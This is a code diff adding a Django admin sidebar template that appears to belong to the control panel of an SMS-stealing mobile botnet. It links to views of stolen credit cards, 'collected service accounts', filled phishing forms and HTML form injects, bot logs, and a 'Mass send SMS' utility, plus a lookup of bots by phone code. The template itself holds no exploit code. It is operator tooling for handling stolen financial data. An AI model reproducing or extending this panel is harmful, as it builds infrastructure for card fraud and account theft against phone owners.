@@ -1,0 +1,104 @@
+{% extends "admin/index.html" %}
+{% load admin_urls %}
+
+{% block sidebar %}
+    <div id="content-menu" class="col-sm-12">
+        <div class="tabbable">
+            <h2 class="app-name">Navigation</h2>
+            <table summary="Jump to..." class="table table-striped table-bordered">
+                <tbody>
+                <tr>
+                    <td>Phone by code:
+                        <form method="POST" class="form-inline" action="{% url 'bot_by_code_post' %}">
+                            {% csrf_token %}
+                            <div class="form-group">
+                                <label>
+                                    Code
+                                    <input class="form-control" type="text" name="code"/>
+                                </label>
+                            </div>
+                            <button type="submit" class="btn btn-default">Go</button>
+                        </form>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+            <h2 id="infos" class="app-name">Info</h2>
+            <table summary="Collected information" class="table table-striped table-bordered">
+                <tbody>
+                {% if perms.smsapp.view_cards %}
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'card_list' %}">Credit cards</a>
+                        </td>
+                    </tr>
+                {% endif %}
+                {% if user.is_superuser %}
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'country_list_admin' %}">Countries</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'billing_list' %}">Billing accounts</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'app_list' %}">Installed apps</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'accounts_list' %}">Collected service accounts</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'forms_list' %}">Filled forms</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td scope="row">
+                            <a href="{% url 'html_forms_list' %}">HTML forms</a>
+                        </td>
+                    </tr>
+                {% endif %}
+                </tbody>
+            </table>
+            {% if user.is_superuser %}
+                <h2 id="stats" class="app-name">Utilities</h2>
+                <table summary="Various utilities." class="table table-striped table-bordered">
+                    <tbody>
+                    <tr>
+                        <th scope="row">
+                            <a href="{% url 'mass_sms_send' %}">Mass send SMS</a>
+                        </th>
+                    </tr>
+                    <tr>
+                        <th scope="row">
+                            <a href="{% url 'option_blacklist' %}">App blacklist</a>
+                        </th>
+                    </tr>
+                    </tbody>
+                </table>
+                <h2 id="stats" class="app-name">Statistics</h2>
+                <table summary="Various statistics." class="table table-striped table-bordered">
+                    <tbody>
+                    <tr>
+                        <th scope="row">
+                            <a href="{% url 'admin:sender_stats' %}">Top senders</a>
+                        </th>
+                    </tr>
+                    <tr>
+                        <th scope="row">
+                            <a href="{% url 'admin:smsapp_logrecord_changelist' %}">Bot logs</a>
+                        </th>
+                    </tr>
+                    </tbody>
+                </table>
+            {% endif %}
+        </div>
+    </div>
+{% endblock %}
